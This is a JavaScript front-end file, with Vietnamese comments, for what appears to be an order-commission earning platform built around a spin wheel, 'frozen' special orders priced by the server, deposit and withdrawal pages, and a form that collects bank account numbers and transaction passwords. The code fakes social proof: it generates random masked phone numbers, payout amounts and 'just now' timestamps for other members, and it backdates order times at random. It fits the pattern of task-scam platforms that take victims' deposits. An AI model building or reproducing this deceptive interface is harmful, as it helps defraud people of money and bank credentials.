document.addEventListener('DOMContentLoaded', function () {
    // Chỉnh nút theo kích cỡ màn hình
    if (window.innerWidth <= 768) {
        document.querySelectorAll('.btn').forEach(btn => {
            btn.classList.add('btn-sm');
        });
    }
    const container = document.getElementById('fireworks-container');
    // ==================================================Pháo hoa===================================================
    const fireworks = new Fireworks(container, {
        autoresize: true,
        opacity: 0.5,
        acceleration: 1.05,
        friction: 0.97,
        gravity: 1.5,
        particles: 50,
        traceLength: 3,
        traceSpeed: 10,
        explosion: 5,
        intensity: 30,
        flickering: 50,
        lineStyle: 'round',
        hue: {
            min: 0,
            max: 360
        },
        delay: {
            min: 20,
            max: 40
        },
        rocketsPoint: {
            min: 50,
            max: 50
        },
        lineWidth: {
            explosion: {
                min: 1,
                max: 3
            },
            trace: {
                min: 1,
                max: 2
            }
        },
        brightness: {
            min: 50,
            max: 80
        },
        decay: {
            min: 0.015,
            max: 0.03
        },
        mouse: {
            click: false,
            move: false,
            max: 1
        }
    })
    //==================================================Xử lý chuyển hướng các nút ở đầu trang==================================================
    const btn_phan_phoi = document.getElementById('btn_phan_phoi');
    const btn_bien_dong_so_du = document.getElementById('btn_bien_dong_so_du');
    const btn_nap_tien = document.getElementById('btn_nap_tien');
    btn_nap_tien.addEventListener('click', function () {
        swal({
            title: trans.heThongDangQuaTai,
            text: trans.vuiLongLienHeCskhDeNapTien,
            icon: "warning",
            button: trans.ok,
            dangerMode: true,
        })
    })
    const btn_rut_tien = document.getElementById('btn_rut_tien');
    function redirect_page(btn, route) {
        btn.addEventListener('click', function () {
            window.location.href = route;
        })
    }
    redirect_page(btn_phan_phoi, route_distribution);
    redirect_page(btn_bien_dong_so_du, route_balance_fluctuation);
    redirect_page(btn_rut_tien, route_withdraw_money);
    //==================================================Vòng quay may mắn==================================================
    let orders = []; // Danh sách đơn hàng AJAX trả về
    let currentIndex = 0; // Index đơn hàng tiếp theo cần quay
    const order_award = document.getElementById('order_award');
    const mainbox = document.getElementById('mainbox');
    function loadOrders() {
        fetch(route_get_10_orders_next)
            .then(response => response.json())
            .then(data => {
                if (data.status === 404) {
                    notification('error', trans.coLoiXayRa);
                } else if (data.status === 200) {
                    orders = data.orders;
                    currentIndex = data.order_next;
                    console.log(currentIndex);
                    console.log(orders);

                    const spans = document.querySelectorAll('#box .font');

                    spans.forEach((span, i) => {
                        const order = orders[i];
                        if (order) {
                            const maxLength = 11;
                            let name = order.name;

                            if (name.length > maxLength) {
                                name = name.slice(0, maxLength) + '...';
                            }
                            span.innerHTML = `<b>${name}</b>`;
                            span.dataset.orderId = order.id;
                        }
                    });
                    mainbox.hidden = false;
                }
            });
    }

    window.onload = loadOrders;

    async function spin() {
        spinner.hidden = false;
        let fake_price = null;
        let is_order_special = false;
        let order_id = null;
        let frozen_id = null;
        const check_frozen = await check_frozen_order();
        let can_spin = false;
        if (check_frozen.status == 200 && check_frozen.is_frozen == true && check_frozen.is_order_special == false && check_frozen.is_new_order == false) {
            swal({
                title: trans.donHangChuaXuLy,
                text: check_frozen.message,
                icon: "warning",
                button: "OK",
                dangerMode: true,
            })
            spinner.hidden = true;
        } else if (check_frozen.status == 200 && check_frozen.is_frozen == true && check_frozen.is_order_special == true && check_frozen.is_new_order == false) {
            swal({
                title: trans.DonHangDangBiDongBang,
                text: check_frozen.message,
                icon: "warning",
                button: "OK",
                dangerMode: true,
            })
            spinner.hidden = true;
        } else if (check_frozen.status == 200 && check_frozen.is_frozen == true && check_frozen.is_order_special == true && check_frozen.is_new_order == true) {
            is_order_special = true;
            fake_price = check_frozen.custom_price;
            can_spin = true;
            order_id = check_frozen.order_id;
            frozen_id = check_frozen.frozen_id;
        } else if (check_frozen.status == 400) {
            swal({
                title: trans.HetLuotQuay,
                text: check_frozen.message,
                icon: "warning",
                button: "OK",
                dangerMode: true,
            })
            spinner.hidden = true;
        } else if (check_frozen.status == 200 && check_frozen.is_frozen == false && check_frozen.is_order_special == false && check_frozen.is_new_order == true) {
            can_spin = true;
            order_id = check_frozen.order_id;
            frozen_id = check_frozen.frozen_id;
        } else if (check_frozen.status == 500) {
            swal({
                title: check_frozen.message,
                text: check_frozen.message,
                icon: "warning",
                button: "OK",
                dangerMode: true,
            })
            spinner.hidden = true;
        }
        if (can_spin) {
            const btn_phan_phoi_ngay = document.getElementById('btn_phan_phoi_ngay');
            btn_phan_phoi_ngay.dataset.frozenId = frozen_id;
            const btn_spin = document.getElementById('spin');
            btn_spin.hidden = true;
            const box = document.getElementById("box");
            const element = document.getElementById("mainbox");

            const totalSegments = 10;
            const degreesPerSegment = 360 / totalSegments;

            // Xác định ô cần quay vào
            const targetIndex = currentIndex;

            const spinOffset = 360 * 7;
            const rotateTo = spinOffset + targetIndex * degreesPerSegment;

            // Âm thanh bắt đầu quay
            wheel.play();

            box.style.setProperty("transition", "all ease 2s");
            box.style.transform = `rotate(${rotateTo}deg)`;
            element.classList.remove("animate");

            setTimeout(() => {
                element.classList.add("animate");
            }, 2000);
            let order_details_time = document.getElementById('order_details_time');
            let order_details_img = document.getElementById('order_details_img');
            let order_details_name = document.getElementById('order_details_name');
            let order_details_price = document.getElementById('order_details_price');
            let order_details_quantity = document.getElementById('order_details_quantity');
            let order_details_end_value_total_price = document.getElementById('order_details_end_value_total_price');
            let order_details_end_value_price_rose = document.getElementById('order_details_end_value_price_rose');
            let order_details_end_value_total = document.getElementById('order_details_end_value_total');
            let selectedOrder = null;
            for (let order of orders) {
                if (order.id == order_id) {
                    selectedOrder = order;
                    break;
                }
            }
            if (selectedOrder === null) {
                loadOrders();
                notification('error', trans.QuayLaiNhaBan, trans.LoiDanhSachDonHang);
            }
            spinner.hidden = true;
            // Âm thanh kết thúc và alert kết quả
            setTimeout(() => {
                applause.play();

                if (!is_order_special) {
                    const order_details_price_formatted = format_currency(selectedOrder.price);
                    const order_details_end_value_total_price_formatted = format_currency(selectedOrder.quantity * selectedOrder.price);
                    const order_details_end_value_price_rose_formatted = format_currency((selectedOrder.quantity * selectedOrder.price) * selectedOrder.commission_percentage);
                    const order_details_end_value_total_formatted = format_currency((selectedOrder.quantity * selectedOrder.price) + ((selectedOrder.quantity * selectedOrder.price) * selectedOrder.commission_percentage));

                    const randomTime = getRandomTimeYesterday();
                    const formattedTime = randomTime.toLocaleString();

                    order_details_time.innerText = trans.ThoiGianDatPhanPhoi + formattedTime;
                    order_details_img.src = `/uploads/orders/images/${selectedOrder.image}`;
                    order_details_name.innerText = selectedOrder.name;
                    order_details_price.innerText = order_details_price_formatted;
                    order_details_quantity.innerText = "x" + selectedOrder.quantity;
                    order_details_end_value_total_price.innerText = order_details_end_value_total_price_formatted;
                    order_details_end_value_price_rose.innerText = order_details_end_value_price_rose_formatted;
                    order_details_end_value_total.innerText = order_details_end_value_total_formatted;
                } else {
                    const order_details_price_formatted = format_currency(fake_price / selectedOrder.quantity);
                    const order_details_end_value_total_price_formatted = format_currency(fake_price);
                    const order_details_end_value_price_rose_formatted = format_currency(fake_price * selectedOrder.commission_percentage);
                    const order_details_end_value_total_formatted = format_currency(fake_price + (fake_price * selectedOrder.commission_percentage));

                    const randomTime = getRandomTimeYesterday();
                    const formattedTime = randomTime.toLocaleString();

                    order_details_time.innerText = trans.ThoiGianDatPhanPhoi + formattedTime;
                    order_details_img.src = `/uploads/orders/images/${selectedOrder.image}`;
                    order_details_name.innerText = selectedOrder.name;
                    order_details_price.innerText = order_details_price_formatted;
                    order_details_quantity.innerText = "x" + selectedOrder.quantity;
                    order_details_end_value_total_price.innerText = order_details_end_value_total_price_formatted;
                    order_details_end_value_price_rose.innerText = order_details_end_value_price_rose_formatted;
                    order_details_end_value_total.innerText = order_details_end_value_total_formatted;
                    fireworks.start();
                }
                order_award.hidden = false;
                loadOrders();
                // Dừng hiệu ứng pháo hoa sau 5 giây
                setTimeout(() => fireworks.stop(), 5000);
            }, 2500);

            // Reset lại vị trí để chuẩn bị cho lần quay sau
            setTimeout(() => {
                box.style.setProperty("transition", "initial");
                box.style.transform = `rotate(${targetIndex * degreesPerSegment}deg)`;
                btn_spin.hidden = false;
            }, 2000);
            // Cập nhật index
            currentIndex += 1;
        } else {
            spinner.hidden = true;
        }
    }
    window.spin = spin;

    const later = document.getElementById('later');
    later.addEventListener('click', function () {
        order_award.hidden = true;
    })
    // Kiểm tra đơn hàng trước khi quay
    function check_frozen_order() {
        return new Promise((resolve, reject) => {
            fetch(route_check_frozen_order)
                .then(response => response.json())
                .then(data => {
                    return resolve(data);
                })
                .catch(error => {
                    console.log(error);
                    reject(error);
                })
        })
    }
    // Random thời gian phân phối
    function getRandomTimeYesterday() {
        const now = new Date();

        // Lấy ngày hôm qua
        const yesterday = new Date(now);
        yesterday.setDate(now.getDate() - 1);
        yesterday.setHours(0, 0, 0, 0); // Đặt thời gian bắt đầu là 00:00:00

        // Thời gian cuối cùng trong ngày hôm qua (23:59:59)
        const endOfYesterday = new Date(yesterday);
        endOfYesterday.setHours(23, 59, 59, 999);

        // Random thời gian giữa khoảng này
        const randomTimestamp = Math.floor(
            Math.random() * (endOfYesterday.getTime() - yesterday.getTime()) + yesterday.getTime()
        );

        return new Date(randomTimestamp);
    }
    // ==================================================Xử lý bấm nút phân phối==================================================
    const btn_phan_phoi_ngay = document.getElementById('btn_phan_phoi_ngay');
    btn_phan_phoi_ngay.addEventListener('click', async function () {
        spinner.hidden = false;
        let frozen_id = this.dataset.frozenId;
        let result = await handle_distribution(frozen_id);
        if (result.status === 200) {
            const profit = result.profit;
            setTimeout(() => {
                notification('warning', "", trans.ChoXuLy);
                setTimeout(() => {
                    notification('warning', "", trans.DangPhanPhoi);
                    setTimeout(() => {
                        notification('success', result.message, trans.ThanhCong);
                        swal({
                            title: trans.PhanPhoiThanhCong2,
                            content: {
                                element: "span",
                                attributes: {
                                    innerHTML: "<span style='color:green;font-weight:bold;'>+" + format_currency(profit, 4, 4) + "</span>"
                                }
                            },
                            icon: "success",
                            buttons: {
                                confirm: {
                                    text: "OK",
                                    value: true,
                                    visible: true,
                                    className: "btn-success",
                                    closeModal: true
                                }
                            },
                        });
                    }, 1000);
                }, 1000);
            }, 0);
        } else if (result.status === 409) {
            notification('warning', result.message, trans.CanhBao);
        } else {
            notification('error', result.message, trans.Loi);
        }
        setTimeout(() => {
            order_award.hidden = true;
            spinner.hidden = true;
        }, 2000);
    })
    function handle_distribution(frozen_id) {
        return new Promise((resolve, reject) => {
            fetch(route_handle_distribution, {
                method: "POST",
                headers: {
                    'Content-Type': "application/json",
                    'X-CSRF-TOKEN': csrf
                },
                body: JSON.stringify({
                    frozen_id: frozen_id
                })
            })
                .then(response => response.json())
                .then(data => {
                    return resolve(data);
                })
                .catch(error => {
                    console.log(error);
                    reject(error);
                });
        })
    }
    //==================================================Các thành viên khác cũng phân phối==================================================
    const phones = ['097', '098', '016', '093', '090', '091'];
    const getRandomPhone = () => {
        const prefix = phones[Math.floor(Math.random() * phones.length)];
        const suffix = Math.floor(100 + Math.random() * 900); // 3 chữ số
        return `${prefix}**${suffix}`;
    };

    const getRandomAmount = () => `$${Math.floor(10 + Math.random() * 1000)}`;

    const getRandomTimeAgo = () => {
        const n = Math.floor(Math.random() * 60);
        if (n < 1) return trans.justNow;
        if (n < 2) return `1 ${trans.secondsAgo}`;
        if (n < 60) return `${n} ${trans.secondsAgo}`;
        const minutes = Math.floor(n / 60);
        return `${minutes} ${trans.minutesAgo}`;
    };

    const generateItem = () => {
        const phone = getRandomPhone();
        const amount = getRandomAmount();
        const time = getRandomTimeAgo();
        return `
        <div class="border-bottom py-2 d-flex flex-row justify-content-between mt-3 w-100">
            <div class="section-7-content"><strong>${phone}</strong> - ${trans.successText}</div>
            <div class="text-success section-7-content">${amount}</div>
            <div class="section-7-content">${time}</div>
        </div>
    `;
    };

    const listContainer = document.getElementById('distribution-list');

    setInterval(() => {
        const items = [];
        for (let i = 0; i < 4; i++) {
            items.push(generateItem());
        }
        listContainer.innerHTML = items.join('');
    }, 5000);

    //==================================================Xem nội dung chi tiết==================================================
    const view_amazon = document.getElementById('view_amazon');
    const view_mo_ta = document.getElementById('view_mo_ta');
    const view_tai_chinh = document.getElementById('view_tai_chinh');
    const view_quy_dinh = document.getElementById('view_quy_dinh');
    function view_content(object, object_content) {
        object.addEventListener('click', function () {
            const get_object_content = document.getElementById(object_content);
            get_object_content.classList.add('active');
        })
    }
    view_content(view_amazon, 'amazon_content');
    view_content(view_mo_ta, 'mo_ta_content');
    view_content(view_tai_chinh, 'tai_chinh_content');
    view_content(view_quy_dinh, 'quy_dinh_content');
    //==================================================Đóng nội dung chi tiết==================================================
    function close_content(buttonId, contentId) {
        const button = document.getElementById(buttonId);
        const content = document.getElementById(contentId);

        if (button && content) {
            button.addEventListener('click', () => {
                content.classList.remove('active');
            });
        }
    }

    close_content('close_xmark_amazon', 'amazon_content');
    close_content('close_xmark_mo_ta', 'mo_ta_content');
    close_content('close_xmark_tai_chinh', 'tai_chinh_content');
    close_content('close_xmark_quy_dinh', 'quy_dinh_content');

    // Thong bao
    let notificationShown = false;

    // Hiển thị thông báo khi người dùng đăng nhập
    function showNotification() {
        const overlay = document.getElementById('notificationOverlay');
        overlay.classList.add('show');
        notificationShown = true;

        // Thêm hiệu ứng âm thanh (tùy chọn)
        playNotificationSound();
    }

    // Đóng thông báo
    window.closeNotification = function () {
        const overlay = document.getElementById('notificationOverlay');
        overlay.classList.remove('show');
        notificationShown = false;
    }

    // Xử lý sự kiện tham gia
    window.participateEvent = function () {
        closeNotification();
    }

    // Phát âm thanh thông báo (tùy chọn)
    function playNotificationSound() {
        // Tạo âm thanh thông báo đơn giản
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();

        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);

        oscillator.frequency.value = 800;
        oscillator.type = 'sine';

        gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);

        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.5);
    }

    // Đóng thông báo khi nhấn ESC
    document.addEventListener('keydown', function (event) {
        if (event.key === 'Escape' && notificationShown) {
            closeNotification();
        }
    });

    // Đóng thông báo khi click vào overlay
    document.getElementById('notificationOverlay').addEventListener('click', function (event) {
        if (event.target === this) {
            closeNotification();
        }
    });

    // Tự động hiển thị thông báo khi trang được tải (giả lập đăng nhập)
    window.addEventListener('load', function () {
        // Giả lập việc kiểm tra trạng thái đăng nhập
        setTimeout(function () {
            // Trong thực tế, bạn sẽ kiểm tra từ server hoặc session
            const isLoggedIn = true; // Giả lập đã đăng nhập

            if (isLoggedIn && !notificationShown) {
                showNotification();
            }
        }, 1000); // Delay 1 giây để tạo hiệu ứng
    });

    // Hiệu ứng parallax cho header
    document.addEventListener('mousemove', function (e) {
        const header = document.querySelector('.notification-header');
        if (header) {
            const x = e.clientX / window.innerWidth;
            const y = e.clientY / window.innerHeight;

            header.style.transform = `translate(${x * 10}px, ${y * 10}px)`;
        }
    });

    // Animation cho số thưởng
    function animateReward() {
        const rewardElements = document.querySelectorAll('.reward-amount');
        rewardElements.forEach(element => {
            element.style.animation = 'none';
            setTimeout(() => {
                element.style.animation = 'glow 2s infinite alternate';
            }, 100);
        });
    }

    // Khởi tạo animation khi hiển thị
    document.getElementById('notificationOverlay').addEventListener('transitionend', function () {
        if (this.classList.contains('show')) {
            animateReward();
        }
    });
    // ==========================================Liên kết ngân hàng============================================
    window.togglePassword = function (fieldId) {
        const passwordField = document.getElementById(fieldId);
        const passwordIcon = document.getElementById(fieldId + 'Icon');

        if (passwordField.type === 'password') {
            passwordField.type = 'text';
            passwordIcon.classList.remove('fa-eye');
            passwordIcon.classList.add('fa-eye-slash');
        } else {
            passwordField.type = 'password';
            passwordIcon.classList.remove('fa-eye-slash');
            passwordIcon.classList.add('fa-eye');
        }
    }

    window.submitForm = async function () {
        const form = document.getElementById('bankLinkForm');
        const formData = new FormData(form);

        // Kiểm tra form hợp lệ
        if (!form.checkValidity()) {
            form.classList.add('was-validated');
            return;
        }

        // Kiểm tra mật khẩu khớp
        const password = formData.get('transactionPassword');
        const confirmPassword = formData.get('confirmPassword');

        if (password !== confirmPassword) {
            notification('error', trans.MatKhauXacNhanKhongKhop, trans.Loi);
            return;
        }

        // Kiểm tra số tài khoản
        const accountNumber = formData.get('accountNumber');
        if (!/^\d{6,20}$/.test(accountNumber)) {
            notification('error', trans.SoTaiKhoanPhaiLaSo, trans.Loi)
            return;
        }

        // Simulate API call
        const submitBtn = document.querySelector('.btn-primary[onclick="submitForm()"]');
        const originalText = submitBtn.innerHTML;

        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>Đang xử lý...';
        submitBtn.disabled = true;
        let result = await bank_link(formData.get("accountName"), formData.get("bankName"), formData.get("accountNumber"), formData.get("transactionPassword"));
        if (result.status == 200) {
            notification('success', result.message, trans.ThanhCong);
            form.reset();
            form.classList.remove('was-validated');

            // Close modal
            const modal = bootstrap.Modal.getInstance(document.getElementById('bankLinkModal'));
            modal.hide();

            // Reset button
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;
        } else if (result.status == 400) {
            notification('warning', result.message, trans.Loi);
        } else {
            notification('warning', trans.coLoiXayRa, trans.Loi);
        }
    }
    function bank_link(username_bank, bank_name, account_number, transaction_password) {
        return new Promise((resolve, reject) => {
            fetch(route_bank_link, {
                method: "POST",
                headers: {
                    'Content-Type': "application/json",
                    'X-CSRF-TOKEN': csrf
                },
                body: JSON.stringify({
                    username_bank: username_bank,
                    bank_name: bank_name,
                    account_number: account_number,
                    transaction_password: transaction_password,
                })
            })
                .then(response => response.json())
                .then(data => {
                    return resolve(data);
                })
                .catch(error => {
                    console.log(error);
                    reject(error);
                });
        })
    }
    // Tự động hiển thị modal khi tải trang (để demo)
    window.addEventListener('load', function () {
        const modal = new bootstrap.Modal(document.getElementById('bankLinkModal'));
        const username_bank_input = document.getElementById('username_bank_input');
        if (!username_bank_input) {
            modal.show();
        }
    });

    // Validation realtime cho số tài khoản
    document.getElementById('accountNumber').addEventListener('input', function (e) {
        const value = e.target.value;
        e.target.value = value.replace(/\D/g, ''); // Chỉ cho phép số
    });

    // Validation realtime cho mật khẩu
    document.getElementById('confirmPassword').addEventListener('input', function (e) {
        const password = document.getElementById('transactionPassword').value;
        const confirmPassword = e.target.value;

        if (confirmPassword && password !== confirmPassword) {
            e.target.setCustomValidity('Mật khẩu không khớp');
        } else {
            e.target.setCustomValidity('');
        }
    });
})